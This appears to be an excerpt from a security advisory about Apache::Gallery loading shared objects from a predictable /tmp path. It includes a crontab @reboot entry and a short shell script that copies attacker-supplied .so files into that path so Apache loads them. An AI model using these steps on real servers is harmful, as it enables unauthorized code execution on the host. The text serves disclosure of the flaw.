An exploit has been developed by Jon Hart <warchild@spoofed.org> to demonstrate this issue.

Also, the following small example demonstrates how the target .so files can be deleted during a reboot, allowing for the attacker-supplied shared objects to successfully replace them before Apache is invoked.

The following crontab entry will result in the execution of the exploit script as soon as cron is started:

@reboot /path/to/exploit/exploit.sh

exploit.sh will contain something similar to:

#!/bin/sh
mkdir -p /tmp/lib/auto/Apache/Gallery_4033
cp ~/exploits/Gallery* /tmp/lib/auto/Apache/Gallery_4033
